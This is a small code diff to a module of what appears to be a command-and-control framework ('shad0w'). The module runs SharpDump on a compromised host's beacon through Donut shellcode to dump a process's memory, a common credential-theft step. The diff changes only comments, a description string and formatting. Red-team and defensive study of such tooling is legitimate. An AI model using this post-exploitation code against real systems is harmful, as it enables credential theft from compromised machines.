@@ -6,8 +6,9 @@ import argparse
 
 from lib import shellcode
 
-__description__ = "A tool to create a minidump of a process"
+__description__ = "Create a mini dump of a process"
 __author__ = "@_batsec_, @harmj0y"
+__type__ = "process"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
@@ -15,26 +16,29 @@ USERCD_EXEC_ID = 0x3000
 # location of sharpdump binary
 SHARPDUMP_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SharpDump.exe"
 
-# little hack but lets us pass the args to donut
+
 class DummyClass(object):
+    # little hack but lets us pass the args to Donut
     def __init__(self):
         pass
+
 
 def sharpdump_callback(shad0w, data):
     print(data)
 
     return ""
 
+
 def main(shad0w, args):
 
     # check we actually have a beacon
     if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
+        shad0w.debug.log("ERROR: No active beacon.", log=True)
         return
 
     sharpdump_args = ' '.join(args[1:])
 
-    # kinda a hack to make sure we intergrate nice with the shellcode generator
+    # kind of a hack to make sure we integrate nice with the shellcode generator
     args = DummyClass()
 
     if len(sharpdump_args) != 0:
